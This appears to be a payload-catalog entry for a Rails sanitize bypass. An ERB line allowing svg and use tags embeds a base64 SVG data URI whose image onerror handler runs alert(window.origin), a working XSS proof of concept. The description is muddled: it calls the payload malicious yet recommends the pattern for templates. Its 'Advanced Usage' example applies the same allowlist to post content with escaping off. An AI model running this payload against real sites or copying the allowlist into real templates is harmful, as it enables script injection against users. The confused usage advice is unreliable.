---
data: >-
  <%= sanitize "<svg><use
  href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\"/"></svg>",
  tags: %w(svg use) %>
tags:
  - rails
  - sanitize
  - xss
type: command
executor: erb
platforms:
  - Web
id: 649d144c-26c1-4e70-97c6-21e53c5bd438
created_at: '2025-12-13T23:52:34.184Z'
updated_at: '2025-12-13T23:52:34.184Z'
verified: false
validated: true
submitted: true
---
# rails-sanitize-html-with-svg-tags

## Command

```erb
<%= sanitize "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\"/"></svg>", tags: %w(svg use) %>
```

## Description

This ERB command uses Rails' sanitize helper to process and render HTML input, allowing 'svg' and 'use' tags. It injects a malicious payload that bypasses Loofah sanitization, embedding a base64 data URI for XSS. Use in templates where user input is sanitized.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `sanitize input` | The HTML string to sanitize, including the SVG payload | Yes |
| `tags: %w(svg use)` | Array of allowed tags; permits SVG elements | Yes |

## Examples

### Basic Usage

```erb
<%= sanitize malicious_svg_string, tags: %w(svg use) %>
```

### Advanced Usage

```erb
<%= sanitize @post.content, tags: %w(svg use p div), escape: false %>
```

## Expected Output

Rendered HTML with the SVG intact: <svg><use href="data:image/svg+xml;base64,..."></use></svg>. When viewed in browser, triggers XSS alert if configured.

## Related

- [[Related Procedure]]
